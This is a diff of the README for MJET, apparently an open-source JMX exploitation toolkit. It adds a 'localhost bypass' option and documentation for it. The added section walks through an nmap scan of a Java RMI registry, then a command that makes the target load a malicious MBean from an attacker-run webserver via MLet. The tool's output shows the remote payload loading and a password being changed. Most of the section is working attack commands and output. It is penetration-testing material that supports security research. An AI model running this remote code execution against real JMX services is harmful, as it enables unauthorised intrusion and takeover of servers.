@@ -28,12 +28,13 @@ Where
 * **MODE** - the script mode
 * **modeOptions** - the options for the mode selected
 
-Optional arguments (if JMX authentication is enabled):
+Authentication support (if JMX authentication is enabled):
 * **--jmxrole** - the username
 * **--jmxpassword** - the password
 
-Optional argument (if target uses JMXMP):
-* **--jmxmp** - no arguments
+Other optional arguments:
+* **--jmxmp** - Use JMX-MP (requires to load an additional JAR)
+* **--localhost_bypass** - service port for the proxy in localhost bypass
 
 ### Modes and modeOptions
 
@@ -281,13 +282,63 @@ MJET - MOGWAI LABS JMX Exploitation Toolkit
 
 ```
 
-### JMX message protocol
+### JMX message protocol (JMXMP) support
 
 Download [opendmk_jmxremote_optional_jar-1.0-b01-ea.jar](https://mvnrepository.com/artifact/org.glassfish.external/opendmk_jmxremote_optional_jar/1.0-b01-ea) and move it into the jars directory. You need to add this directory to the classpath via `java -cp`.
 
 ```bash
 java -cp "jython.jar:jars/*" org.python.util.jython mjet.py shell mypass
 ```
+
+### Localhost bypass
+
+It sometimes happens that the RMI registry exposes a RemoteObject that is only accessible on localhost (example @127.0.0.1:45401). However, the port is open where the RemoteObject is accessible over the network. 
+
+```bash
+$ nmap -sVC 172.17.0.2 -p 9999,45401
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2020-03-24 16:48 CET
+Nmap scan report for 172.17.0.2
+Host is up (0.00035s latency).
+
+PORT      STATE SERVICE     VERSION
+9999/tcp  open  java-rmi    Java RMI Registry
+| rmi-dumpregistry: 
+|   jmxrmi
+|      implements javax.management.remote.rmi.RMIServer, 
+|     extends
+|       java.lang.reflect.Proxy
+|       fields
+|           Ljava/lang/reflect/InvocationHandler; h
+|             java.rmi.server.RemoteObjectInvocationHandler
+|             @127.0.0.1:45401
+|             extends
+|_              java.rmi.server.RemoteObject
+45401/tcp open  rmiregistry Java RMI
+```
+It is still possible to exploit this service by using the `--localhost_bypass <PORT>` option. In the following example, we use port 45401. This will start a TCP proxy on localhost and forward the traffic to the targetHost on the supplied port.
+```bash
+$ jython mjet.py --localhost_bypass 45401 172.17.0.2 9999 install mypass http://172.17.0.1:6666 6666
+
+MJET - MOGWAI LABS JMX Exploitation Toolkit
+===========================================
+[+] Starting webserver at port 6666
+[+] Using JMX RMI
+[+] Connecting to: service:jmx:rmi:///jndi/rmi://172.17.0.2:9999/jmxrmi
+[+] Started localhost proxy on port 45401
+[+] Connected: rmi://172.17.0.1  17
+[+] Loaded javax.management.loading.MLet
+[+] Loading malicious MBean from http://172.17.0.1:6666
+[+] Invoking: javax.management.loading.MLet.getMBeansFromURL
+172.17.0.2 - - [24/Mar/2020 18:07:01] "GET / HTTP/1.1" 200 -
+[+] Successfully loaded MBeanMogwaiLabs:name=payload,id=1
+[+] Changing default password...
+[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
+[+] Successfully changed password
+[+] Done
+``` 
+
+Reference: https://www.optiv.com/blog/exploiting-jmx-rmi
 
 ## Contributing
 
@@ -300,7 +351,7 @@ Feel free to contribute.
 * **Ben Campbell** - *Several improvements* - [Meatballs1](https://github.com/Meatballs1)
 * **Arnim Rupp** - *Authentication support*
 * **Sebastian Kindler** - *Deserialization support*
-* **Karsten Zeides** - *JMX Message Protocol support* [zeides](https://github.com/zeides)
+* **Karsten Zeides** - *JMX Message Protocol support, localhost bypass* [zeides](https://github.com/zeides)
 
 See also the list of [contributors](https://github.com/mogwailabs/sjet/graphs/contributors) who participated in this project.
 
